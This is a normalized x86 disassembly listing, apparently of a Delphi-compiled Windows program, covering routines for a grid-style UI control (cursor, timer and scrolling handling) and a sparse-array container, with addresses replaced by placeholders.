xor eax eax
push ebp
push sub_4768b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x250 ] 0x0
jne r-xdata
cmp esi [ ebx + 0x24c ]
jl r-xdata
lea eax [ ebx + 0x250 ]
mov ecx [ ebx + 0x234 ]
mov edx [ ebx + 0x24c ]
call sub_471260
mov eax [ ebx + 0x250 ]
mov eax [ eax + esi * 4 + 0x4 ]
cmp edi eax
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x4 ]
call sub_470e64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4768b9
lea eax [ ebp - 0x4 ]
call sub_404074
retn
push edi
mov ecx eax
mov edx esi
mov eax ebx
call sub_474b34
mov eax [ ebx + 0x250 ]
mov [ eax + esi * 4 + 0x4 ] edi
mov eax ebx
mov si 0xffa4
call sub_40349c
sub_4768d4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_476933
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_476a90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov [ eax + 0x284 ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_471a6c
retn
sub_476940
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
mov eax [ eax + 0x228 ]
mov edx [ ebx ]
mov [ edx + 0x280 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x22c ]
mov edx [ ebx ]
mov [ edx + 0x284 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_46e094
inc eax
jne r-xdata
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x1
mov eax [ ebx ]
mov [ eax + 0x219 ] 0x0
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x27c ]
call sub_432054
pop ebx
pop ebp
retn
sub_4769b0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x280 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd0 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x27c ] ebx
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_471380
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
push ebp
call sub_476940
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4768d4
push ebp
call sub_476940
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x284 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
test al al
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x22c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x228 ]
mov eax [ ebp - 0x4 ]
call sub_472120
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_471be4
sub_476a90
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_476af6
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x280 ]
cmp esi 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476afd
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp [ ebx + 0x284 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x27c ]
call sub_46dc40
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebx + 0x284 ]
mov edx esi
mov eax ebx
mov si 0xffae
call sub_40349c
sub_476b04
test [ eax + 0x249 ] 0x4
je r-xdata
call sub_443660
retn
mov cl [ edx + 0x4 ]
sub cl 0x8
je r-xdata
mov dl [ edx + 0x4 ]
call sub_472250
retn
add cl 0xe8
sub cl 0xe0
jae r-xdata
sub_476b2c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x27c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4445f8
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ax [ edi + 0x6 ]
sub ax 0x300
jne r-xdata
mov eax ebx
call sub_476a90
sub_476b90
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442d40
mov edx esp
mov eax ebx
call sub_4763c4
mov edx esp
mov eax ebx
call sub_4742b4
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4445f8
cmp eax [ esi + 0x4 ]
je r-xdata
mov eax ebx
call sub_4768d4
sub_476c04
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
lea edx [ esp + 0x8 ]
mov eax [ esi + 0x8 ]
call sub_406b0c
lea edx [ esp + 0x8 ]
mov ecx esp
mov eax ebx
call sub_43d93c
mov eax [ esp ]
mov [ ebx + 0x274 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x278 ] eax
add esp 0x10
pop esi
pop ebx
retn
sub_476c48
push ebx
push esi
push edi
push ebp
add esp 0xffffff90
mov edi edx
mov esi eax
xor ebx ebx
cmp [ edi + 0x8 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov al [ esi + 0x28e ]
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_442c2c
push ebx
call SetCursor
jmp r-xdata
mov [ esp ] al
lea edx [ esp + 0x10 ]
mov eax esi
call sub_473310
push esp
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov ecx [ esi + 0x278 ]
mov edx [ esi + 0x274 ]
mov eax esi
mov ebp [ eax ]
call [ ebp + 0xcc ]
jmp r-xdata
add esp 0x70
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff1
call sub_45bf50
mov ebx eax
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx 0xfffffff2
call sub_45bf50
mov ebx eax
sub_476cf4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_442d2c
mov edi [ ebx + 0x27c ]
test edi edi
je r-xdata
mov edx esp
mov eax ebx
call sub_4763c4
mov edx esp
mov eax ebx
call sub_4742b4
mov eax ebx
call sub_4769b0
mov eax edi
call sub_4445f8
cmp eax [ esi + 0x4 ]
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_476d40
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_442be4
mov eax ebx
call sub_4752bc
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_476d98
push ebp
mov ebp esp
add esp 0xffffff98
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_476e21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x28e ]
dec al
je r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call KillTimer
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476e28
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28e ] 0x0
retn
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_473310
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_473d04
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_473e44
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4445f8
push eax
call KillTimer
jmp r-xdata
sub_476e40
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_476d98
pop esi
pop ebx
retn
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x74 ]
sub_476e6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x27c ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_443b54
pop esi
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_43deec
sub_476ea4
push ebx
push esi
mov ebx edx
mov esi eax
movsx ecx [ ebx + 0xa ]
movsx edx [ ebx + 0x8 ]
mov eax esi
call sub_472638
neg al
sbb eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_476ec4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x249 ] 0x4
je r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0xd
jne r-xdata
mov [ esi + 0xc ] 0x1
sub_476eec
add esp 0xffffffec
mov [ esp ] dl
mov edx [ eax + 0x210 ]
mov [ esp + 0xc ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x21c ]
dec edx
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x24c ]
dec edx
mov [ esp + 0x8 ] edx
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x2
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ eax + 0x238 ]
jle r-xdata
test [ esp ] 0x4
je r-xdata
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0x4 ]
jge r-xdata
dec [ esp + 0xc ]
test [ esp ] 0x8
je r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ eax + 0x23c ]
jle r-xdata
inc [ esp + 0xc ]
mov edx [ eax + 0x210 ]
cmp edx [ esp + 0xc ]
jne r-xdata
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x8 ]
jge r-xdata
dec [ esp + 0x10 ]
lea edx [ esp + 0xc ]
call sub_4748f4
mov edx [ eax + 0x214 ]
cmp edx [ esp + 0x10 ]
je r-xdata
inc [ esp + 0x10 ]
add esp 0x14
retn
sub_476fa0
push ebx
push esi
push edi
add esp 0xffffff88
mov edi eax
mov al [ edi + 0x28e ]
sub al 0x1
je r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x70 ]
mov edx esp
mov eax edi
call sub_43d93c
mov eax [ esp + 0x70 ]
mov [ esp ] eax
mov eax [ esp + 0x74 ]
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov eax edi
call sub_473310
mov bl [ r-xdata ]
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x8 ]
mov eax edi
call sub_4732b4
mov al [ edi + 0x28e ]
dec al
je r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
sub al 0x3
je r-xdata
add esp 0x78
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_43d7fc
mov esi eax
sub esi [ esp + 0x24 ]
mov eax edi
call sub_43d7fc
sub eax [ esp + 0x14 ]
mov edx [ esp ]
cmp esi edx
jle r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x14 ]
jge r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x44 ]
push eax
push 0x1
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov eax edi
call sub_47620c
jmp r-xdata
dec al
jne r-xdata
cmp eax edx
jge r-xdata
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x24 ]
jle r-xdata
or bl 0x1
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x14 ]
push eax
push 0x0
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov eax edi
call sub_47620c
jmp r-xdata
mov eax [ esp + 0x4 ]
cmp eax [ esp + 0x44 ]
jge r-xdata
or bl 0x1
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x54 ]
jle r-xdata
or bl 0x4
jmp r-xdata
mov al [ r-xdata ]
cmp al bl
je r-xdata
or bl 0x8
mov edx ebx
mov eax edi
mov si 0xffa6
call sub_40349c
sub_477164
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4448fc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x40
jne r-xdata
mov eax ebx
call sub_455244
test eax eax
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4771a0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_43e834
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x24c ]
dec edx
mov eax [ ebx + 0x22c ]
cmp edx eax
jle r-xdata
mov al 0x1
mov edx eax
inc edx
mov eax ebx
call sub_4767c0
sub_4771ec
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_43e880
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x22c ]
cmp eax [ ebx + 0x23c ]
jle r-xdata
mov al 0x1
mov edx eax
dec edx
mov eax ebx
call sub_4767c0
sub_4772b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_404074
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
sub_4772f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_404074
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_477358
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_477388
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4773b4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
je r-xdata
mov eax ebx
call sub_43d7fc
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
call sub_43d7fc
mov esi eax
sub esi [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] eax
xor edx edx
mov eax ebx
call sub_4737fc
mov dl 0x1
mov eax ebx
call sub_4737fc
sub_477498
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx [ r-xdata ]
mov eax 0x8
call sub_404e1c
mov ebx eax
mov [ ebx ] edi
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_4040c8
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_477694
push ebx
push esi
push ecx
mov esi ecx
mov ebx edx
mov [ esp ] eax
movzx eax si
mov edx eax
shl edx 0x2
mov eax esp
call sub_40270c
movzx edx si
movzx eax [ ebx ]
sub edx eax
shl edx 0x2
mov ecx [ esp ]
lea eax [ ecx + eax * 4 ]
xor ecx ecx
call sub_402cbc
mov [ ebx ] si
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_4776d0
push ebx
push esi
push edi
mov esi edx
shl esi 0x2
movzx edi si
mov eax edi
call sub_4026cc
mov ebx eax
mov edx edi
mov eax ebx
xor ecx ecx
call sub_402cbc
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_4776f8
push ebx
push esi
test dl dl
je r-xdata
xor ebx ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] 0x0
mov [ eax + 0x10 ] 0xffffffff
xor ebx ebx
mov bl cl
movzx esi [ ebx + rw-data ]
inc esi
mov [ eax + 0x14 ] si
movzx esi [ ebx + rw-data ]
mov [ eax + 0xa ] si
xor ecx ecx
mov cl [ ebx + rw-data ]
mov [ eax + 0xc ] cx
mov [ eax + 0x18 ] 0xffffffff
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_47775c
push ebx
push esi
push edi
push ebp
call sub_40362c
mov ebx edx
mov esi eax
xor ebp ebp
mov di [ esi + 0x14 ]
shl edi 0x2
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp ebp eax
jl r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + ebp * 4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
inc ebp
movzx edx di
call sub_4026ec
test bl bl
jle r-xdata
movzx edx [ esi + 0x8 ]
shl edx 0x2
call sub_4026ec
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4777b4
push ebx
cmp edx [ eax + 0x18 ]
jne r-xdata
mov cx [ eax + 0xc ]
mov ebx edx
shr ebx cl
mov ecx ebx
movzx ebx [ eax + 0x8 ]
cmp ecx ebx
jb r-xdata
mov ecx [ eax + 0x1c ]
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov ecx [ ebx + ecx * 4 ]
test ecx ecx
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ecx
pop ebx
retn
test ecx ecx
jne r-xdata
movzx ebx [ eax + 0xa ]
and ebx edx
shl ebx 0x2
add ecx ebx
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ecx
sub_477800
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov cx [ ebx + 0xc ]
mov esi edi
shr esi cl
cmp si [ ebx + 0x8 ]
jb r-xdata
mov ebp [ ebx + 0x4 ]
lea ecx [ esi + 0x1 ]
lea edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_477694
mov ebp eax
jmp r-xdata
movzx edx [ ebx + 0xa ]
and edx edi
shl edx 0x2
add eax edx
cmp edi [ ebx + 0x10 ]
jle r-xdata
movzx eax si
mov dx [ ebx + 0x14 ]
call sub_4776d0
movzx edx si
mov [ ebp + edx * 4 ] eax
mov [ ebx + 0x4 ] ebp
movzx eax si
mov eax [ ebp + eax * 4 ]
test eax eax
jne r-xdata
mov [ ebx + 0x18 ] 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edi
sub_47786c
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_477800
mov [ eax ] esi
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_4777b4
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_477954
sub_4778a0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp eax [ ebp - 0x18 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x18 ]
mov ebx [ eax + edx * 4 ]
test ebx ebx
je r-xdata
inc [ ebp - 0x18 ]
xor edi edi
mov cx [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
shl eax cl
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax [ esi + 0x14 ]
cmp edi eax
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
add ebx 0x4
inc edi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x14 ] eax
sub_47792c
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp eax [ ecx + 0x10 ]
jle r-xdata
xor ecx ecx
test edx edx
je r-xdata
mov ecx 0x1
jmp r-xdata
mov eax ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
sub_477954
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0xffffffff
mov edx sub_47792c
mov eax [ ebp - 0x4 ]
call sub_4778a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x10 ] edx
pop ecx
pop ecx
pop ebp
retn
sub_477980
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
call sub_477bd8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4779b8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4779e0
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov dl [ ebx + 0xc ]
mov eax ebx
call sub_477bd8
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
sub_477a00
push ebx
push esi
push edi
push ebp
mov ebx eax
test edx edx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edx [ ebx + 0x8 ]
jge r-xdata
mov esi edx
mov edi [ ebx + 0x8 ]
dec edi
sub edi esi
jl r-xdata
xor ecx ecx
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_47786c
dec [ ebx + 0x8 ]
inc edi
lea edx [ esi + 0x1 ]
mov ebp [ ebx + 0x4 ]
mov eax ebp
call sub_4777b4
mov ecx eax
mov edx esi
mov eax ebp
call sub_47786c
inc esi
dec edi
jne r-xdata
sub_477a4c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_477a94
mov ebp eax
mov edx edi
mov eax ebx
call sub_477a94
mov ecx eax
mov edx esi
mov eax ebx
call sub_477bf8
mov ecx ebp
mov edx edi
mov eax ebx
call sub_477bf8
pop ebp
pop edi
pop esi
pop ebx
retn
sub_477a94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_477aef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4777b4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477af6
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x4 ]
mov ecx ebx
mov eax [ r-xdata ]
call sub_413d38
sub_477b00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_477b94
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jge r-xdata
mov ebx [ esi + 0x8 ]
cmp edi ebx
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax [ r-xdata ]
call sub_413d38
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4 ]
call sub_47786c
cmp edi [ esi + 0x8 ]
jle r-xdata
mov edx ebx
dec edx
mov eax [ esi + 0x4 ]
call sub_4777b4
mov ecx eax
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_47786c
dec ebx
cmp edi ebx
jl r-xdata
inc [ esi + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477b9b
lea eax [ ebp - 0x8 ]
call sub_404074
retn
mov [ esi + 0x8 ] edi
sub_477ba4
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_477a94
mov ebp eax
mov edx esi
mov eax ebx
call sub_477a00
mov ecx ebp
mov edx edi
mov eax ebx
call sub_477b00
sub_477bd8
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0xc ] bl
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4776f8
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_477bf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477c60
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jge r-xdata
mov ecx edi
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_47786c
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
inc eax
mov [ ebx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477c67
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413d38
sub_477c70
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
